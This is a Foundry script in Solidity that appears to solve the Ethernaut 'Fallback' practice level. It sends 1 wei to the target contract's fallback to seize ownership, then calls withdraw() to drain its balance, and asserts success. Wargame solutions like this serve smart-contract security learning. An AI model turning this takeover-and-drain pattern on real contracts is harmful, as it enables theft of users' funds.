// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity 0.8.17;

import { Script } from "forge-std/Script.sol";
import { Fallback } from "ethernaut/L0.fallback.sol";

contract StonksCrackerScript is Script {
  function run() external {
    Fallback fb = Fallback(payable(vm.envAddress("ETHERNAUT_FALLBACK_ADDRESS")));
    address wallet = vm.envAddress("WALLET_ADDRESS");

    vm.broadcast(wallet);
    (bool success, ) = address(fb).call{ value: 1 }("");
    require(success);

    vm.broadcast(wallet);
    fb.withdraw();

    assert(fb.owner() == wallet);
    assert(address(fb).balance == 0);
  }
}
